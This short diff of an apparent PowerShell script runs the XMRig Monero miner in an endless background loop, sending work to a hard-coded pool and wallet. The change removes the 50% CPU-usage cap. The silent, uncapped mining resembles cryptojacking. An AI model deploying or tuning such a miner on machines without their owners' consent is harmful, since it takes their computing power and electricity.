@@ -15,5 +15,5 @@ $miner = "$dir\xmrig-6.21.0"
 
 # nạp donate cho SkibiditoiletMiner
 while ($true) {
-    & "$miner\xmrig.exe" --donate-level 1 -o de.monero.herominers.com:1111 -u "48rJxia4YFjiAZsQ7fCS2CLRBbjDQj2iL8LptnzWseJ15oyZ4By5ktC73gcTpeiUXiaqaY8FuD3Mq5Qb2eUAR8xY4KrNJtG" -p "SkibiditoiletMinerminer" -a rx/0 -k --background --max-cpu-usage=50
+    & "$miner\xmrig.exe" --donate-level 1 -o de.monero.herominers.com:1111 -u "48rJxia4YFjiAZsQ7fCS2CLRBbjDQj2iL8LptnzWseJ15oyZ4By5ktC73gcTpeiUXiaqaY8FuD3Mq5Qb2eUAR8xY4KrNJtG" -p "SkibiditoiletMinerminer" -a rx/0 -k --background
 }
